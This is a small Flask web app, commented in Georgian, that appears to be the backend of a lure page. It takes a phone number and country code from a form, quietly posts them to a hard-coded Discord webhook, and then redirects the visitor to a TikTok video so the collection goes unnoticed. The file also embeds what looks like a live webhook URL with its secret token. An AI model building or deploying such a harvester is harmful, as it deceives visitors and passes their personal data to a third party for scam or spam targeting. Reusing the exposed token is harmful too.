from flask import Flask, request, redirect, render_template
import requests
import os

app = Flask(__name__)

# ⬇️ აქ ჩასვი შენი Discord ვებჰუკის ლინკი
WEBHOOK_URL = "https://discord.com/api/webhooks/1571037523944144916/M166376XMNczFiKd5_afTR2wCx9XQ1UNdtq7n4vGjAuP5MNtM8cBxnWHpbHb5OVX28Bz"

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    country_code = request.form.get("country", "")
    phone = request.form.get("phone", "")
    
    if phone and WEBHOOK_URL:
        try:
            # ვაგზავნით Discord-ში
            full_phone = f"{country_code} {phone}"
            requests.post(WEBHOOK_URL, json={"content": f"**ახალი ნომერი:** {full_phone}"}, timeout=5)
            print(f"✅ წარმატებით გაიგზავნა Discord-ში: {full_phone}")
        except Exception as e:
            print(f"❌ Webhook Error: {e}")
    else:
        print("⚠️ ნომერი ცარიელია ან ვებჰუკის ლინკი არ არის ჩასმული!")
    
    # ⬇️ გადადის შენს ვიდეოზე
    TIKTOK_VIDEO_URL = "https://vt.tiktok.com/ZSp4XCejq/"
    return redirect(TIKTOK_VIDEO_URL)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
